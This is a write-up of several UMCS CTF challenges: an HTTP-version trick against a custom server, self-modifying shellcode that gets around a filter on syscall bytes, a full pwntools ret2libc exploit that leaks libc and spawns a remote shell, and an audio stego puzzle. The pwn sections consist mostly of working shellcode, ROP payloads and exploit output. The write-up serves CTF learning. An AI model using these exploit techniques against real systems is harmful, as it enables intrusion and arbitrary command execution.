# UMCS CTF Writeups

## **http-server (RE)**

![image.png](image.png)

### 1. Binary Analysis

I began by examining server.unknown using the strings command:

bash

`strings server.unknown`

```jsx
/lib64/ld-linux-x86-64.so.2
DU}99
puts
__stack_chk_fail
fread
exit
bind
htons
fopen
socket
fork
strlen
strstr
send
recv
malloc
__libc_start_main
listen
inet_aton
__cxa_finalize
malloc_usable_size
accept
fclose
memset
libc.so.6
GLIBC_2.4
GLIBC_2.34
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
[*]Socket Created!
[!]Failed! Cannot create Socket!
10.128.0.27
[*]IP Address and Socket Binded Successfully!
[!]Failed! IP Address and Socket did not Bind!
[*]Socket is currently Listening!
[!]Failed! Cannot listen to the Socket!
[*]Server Started....
[*]Waiting for client to connect.....
[*]Client Connected!
[!]Failed! Cannot accept client request
[*]Handling a Connection!
[!]Failed! No Bytes Received!
GET /goodshit/umcs_server HTTP/13.37
/flag
HTTP/1.1 404 Not Found
Content-Type: text/plain
Could not open the /flag file.
HTTP/1.1 200 OK
Content-Type: text/plain
HTTP/1.1 404 Not Found
Content-Type: text/plain
Not here buddy
9*3$"
GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
                                            
```

This revealed:

- **Socket Operations**: Strings like [*]Socket Created! confirmed the server's network functionality.
- **HTTP Responses**: Formats like HTTP/1.1 404 Not Found and Content-Type: text/plain outlined response structures.
- **Path Behavior**:
    - /flag: Attempted to access a file, failing with a 404.
    - Other paths: Returned "Not here buddy."
- **Key Clue**: GET /goodshit/umcs_server HTTP/13.37, an unusual request with a non-standard HTTP version (13.37).
- **File Functions**: fopen and fread suggested file-based responses in some cases.

### 2. Initial Server Probing

I tested the server with curl to observe its behavior with standard HTTP requests.

### Request to /flag:

```python
curl http://34.133.69.112:8080/flag
```

**Response**:

```python
Not here buddy
```

This differed from the expected "Could not open the /flag file." message, suggesting a possible server tweak or additional logic.

### Request to /goodshit/umcs_server:

```python
curl http://34.133.69.112:8080/goodshit/umcs_server
```

**Response**:

```python
Not here buddy
```

Both requests, using HTTP/1.1, yielded generic 404s, confirming that standard requests wouldn’t suffice.

### 3. Crafting a Custom Request

The HTTP/13.37 clue implied the server required this specific version. Since curl can’t handle arbitrary HTTP versions, I switched to netcat to manually craft the request:

```python
echo -e "GET /goodshit/umcs_server HTTP/13.37\r\nHost: 34.133.69.112\r\n\r\n" | nc 34.133.69.112 8080
```

- **Command Breakdown**:
    - echo -e: Interprets \r\n for proper HTTP line endings.
    - GET /goodshit/umcs_server HTTP/13.37: Specifies the method, path, and version.
    - Host: 34.133.69.112: Required HTTP header.
    - nc 34.133.69.112 8080: Sends the request to the server.

**Response**:

```python
HTTP/1.1 200 OK
Content-Type: text/plain
umcs{http_server_a058712ff1da79c9bbf211907c65a5cd}
```

### babysc (Pwn)

![image.png](image%201.png)

### Overview

- **Challenge**: Execute shellcode on a remote server to read and output /flag.
- **Setup**: Binary maps rwx memory at 0x26e45000, accepts 0x1000 bytes of shellcode, bans bytes 0x80cd, 0x340f, 0x050f (system call instructions).
- **Goal**: Open /flag, read it, write to stdout, exit cleanly.

### Constraints

- **Banned Bytes**: 0x80cd (int 0x80), 0x340f (sysenter), 0x050f (syscall).
- **Impact**: No direct system calls allowed.

### Approach

- **Self-Modifying Shellcode**:
    - Use stub 0x0f 0x04 (safe initially).
    - Modify to 0x0f 0x05 (syscall) at runtime.
    - Perform system calls with modified stub.

### Solution

1. **Shellcode (NASM)**:
    
    
    ```jsx
    BITS 64
    _start:
        lea rax, [rel stub]
        mov byte [rax + 1], 0x05    *; Make syscall*
        lea rdi, [rel flag_str]     *; "/flag"*
        mov rax, 2                  *; open*
        mov rsi, 0                  *; O_RDONLY*
        call stub
        mov r12, rax                *; Save fd*
        mov rax, 0                  *; read*
        mov rdi, r12
        lea rsi, [rel buffer]
        mov rdx, 0x100              *; 256 bytes*
        call stub
        mov rax, 1                  *; write*
        mov rdi, 1                  *; stdout*
        lea rsi, [rel buffer]
        mov rdx, 0x100
        call stub
        mov rax, 60                 *; exit*
        mov rdi, 0
        call stub
    stub:
        db 0x0f, 0x04               *; Becomes 0x0f 0x05*
        ret
    flag_str: db "/flag", 0
    buffer: times 256 db 0
    ```
    
    - **Compile**: nasm -f bin shellcode.asm -o shellcode.bin
2. **Verification**:
    
    ```python
    `with open("shellcode.bin", "rb") as f:
        data = f.read()
    bad_words = [0x80cd, 0x340f, 0x050f]
    for i in range(len(data) - 1):
        word = data[i] | (data[i + 1] << 8)
        if word in bad_words:
            print(f"Bad byte at {i}: {hex(word)}")
            exit(1)
    print("No bad bytes found.")`
    
    - **Result**: No bad bytes.
    ```
    
3. **Exploit (pwntools)**:
    
    ```python
    from pwn import *
    context.arch = 'amd64'
    with open("shellcode.bin", "rb") as f:
        shellcode = f.read()
    r = remote("34.133.69.112", 10001)
    r.send(shellcode)
    print(r.recvall().decode())
    r.close()
    ```
    
    - **Output**: **umcs{shellcoding_78b18b51641a3d8ea260e91d7d05295a**}

### **liveleak**

![image.png](image%202.png)

**Goal**: Get the flag from /flag on the server at 34.133.69.112:10007 using the provided binary chall.

---

## Find Offset

**script**

```python
from pwn import *

# Generate a 100-byte cyclic pattern
pattern = cyclic(100)
with open("pattern.txt", "wb") as f:
    f.write(pattern)

# Run the binary with the pattern
p = process(["./ld-2.35.so", "./chall"])
p.sendline(pattern)
p.wait()

# Check the crash to find the offset
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 8))
print(f"Offset: {offset}")
                                                                            
```

**output**

```python
[+] Starting local process './ld-2.35.so': pid 10845
[*] Process './ld-2.35.so' stopped with exit code -11 (SIGSEGV) (pid 10845)
[+] Parsing corefile...: Done
[*] '/home/kali/Downloads/core.10845'
    Arch:      amd64-64-little
    RIP:       0x401291
    RSP:       0x7ffffcb64e58
    Exe:       '/home/kali/Downloads/ld-2.35.so' (0x7fd170151000)
    Fault:     0x6161617461616173
[!] cyclic_find() expected a 4-byte subsequence, you gave b'saaataaa'
    Unless you specified cyclic(..., n=8), you probably just want the first 4 bytes.
    Truncating the data at 4 bytes.  Specify cyclic_find(..., n=8) to override this.
Offset: 72
                                          
```

## Plan in 3 Steps

1. **Leak an Address**: Trick the program into printing a memory address from libc (a library it uses).
2. **Find Key Addresses**: Use the leaked address to locate system (runs commands) and /bin/sh (a shell).
3. **Get a Shell**: Run system("/bin/sh") to open a shell and grab the flag.

---

## Step-by-Step Exploit

### 1. Leak the Address

- Send a payload to make the program print the address of puts (a function in libc).
- **Payload**:
    - 72 bytes of junk (As).
    - Special addresses to call puts and return to main.

```python
payload = b"A" * 72
payload += b"\xbd\x12\x40\x00\x00\x00\x00\x00"  *# pop rdi; ret*
payload += b"\x18\x40\x40\x00\x00\x00\x00\x00"  *# puts@GOT*
payload += b"\x90\x10\x40\x00\x00\x00\x00\x00"  *# puts@PLT*
payload += b"\x92\x12\x40\x00\x00\x00\x00\x00"  *# main*
```

- Result: You get an address like 0x7f1234567e50.

### 2. Calculate Addresses

- Subtract 0x80e50 (the offset of puts in libc) from the leaked address to find the libc base.
- Add offsets to find:
    - system: base + 0x50d70
    - /bin/sh: base + 0x1d8678

### 3. Get the Shell

- Send a second payload to call system("/bin/sh").
- **Payload**:
    - 72 bytes of junk.
    - Align the stack, then call system with /bin/sh.

```python
payload = b"A" * 72
payload += b"\x1a\x10\x40\x00\x00\x00\x00\x00"  *# ret*
payload += b"\xbd\x12\x40\x00\x00\x00\x00\x00"  *# pop rdi; ret*
payload += p64(bin_sh_addr)  *# /bin/sh address*
payload += p64(system_addr)  *# system address*
```

---

## Full Exploit Code

```python
from pwn import *

# Set up the context
context.binary = "/home/kali/Downloads/chall"
context.log_level = "info"

# Connect to the remote server
p = remote("34.133.69.112", 10007)

# Binary addresses (these remain the same as local)
pop_rdi = 0x4012bd       # Gadget: pop rdi; ret
puts_plt = 0x401090      # PLT address of puts
puts_got = 0x404018      # GOT address of puts
main_addr = 0x401292     # Address to return to main after leak
ret_gadget = 0x40101a    # Simple ret gadget for stack alignment

# Step 1: Leak the puts address from libc
payload = b"A" * 72      # Padding to overwrite return address
payload += p64(pop_rdi)  # pop rdi; ret
payload += p64(puts_got) # Argument: address of puts in GOT
payload += p64(puts_plt) # Call puts to leak the address
payload += p64(main_addr)# Return to main for second input

info("Sending payload to leak libc address")
p.recvuntil(b"Enter your input: ")
p.sendline(payload)

# Receive and parse the leaked address
p.recvline()  # Discard input echo or newline
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
info(f"Leaked puts address: {hex(leak)}")

# Step 2: Calculate libc base and function addresses
puts_offset = 0x80e50    # Offset of puts in libc (same as local)
libc_base = leak - puts_offset
info(f"Libc base: {hex(libc_base)}")

system_offset = 0x50d70  # Offset of system in libc
bin_sh_offset = 0x1d8678 # Offset of /bin/sh string in libc
system_addr = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset
info(f"System address: {hex(system_addr)}")
info(f'/bin/sh address: {hex(bin_sh_addr)}')

# Step 3: Craft payload to call system("/bin/sh") with stack alignment
payload = b"A" * 72      # Padding
payload += p64(ret_gadget)# ret gadget to align stack
payload += p64(pop_rdi)  # pop rdi; ret
payload += p64(bin_sh_addr)# Set rdi to "/bin/sh" address
payload += p64(system_addr)# Call system("/bin/sh")

info("Sending payload to get shell")
p.recvuntil(b"Enter your input: ")
p.sendline(payload)

# Switch to interactive mode to interact with the shell
p.interactive()
```

**output**

```python
*] '/home/kali/Downloads/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 34.133.69.112 on port 10007: Done
[*] Sending payload to leak libc address
[*] Leaked puts address: 0x73b5c73f6e50
[*] Libc base: 0x73b5c7376000
[*] System address: 0x73b5c73c6d70
[*] /bin/sh address: 0x73b5c754e678
[*] Sending payload to get shell
[*] Switching to interactive mode

$ whoami
pwnuser
$ cat /flag
umcs{GOT_PLT_8f925fb19309045dac4db4572435441d}

```

---

Get the Flag

- In the shell, type: cat /flag
- Example flag: umcs{GOT_PLT_8f925fb19309045dac4db4572435441d}

## Hotline Miami

![image.png](image%203.png)

![image.png](image%204.png)

1. **Analyze the file using Audacity**

![image.png](image%205.png)

written as “ WATCHING 1989”

**2.  Use AperiSolve**

![image.png](image%206.png)

Analyze the hints

![image.png](image%207.png)

**try an error 
Flag: umcs{RICHARD_BE_WATCHING_1989}**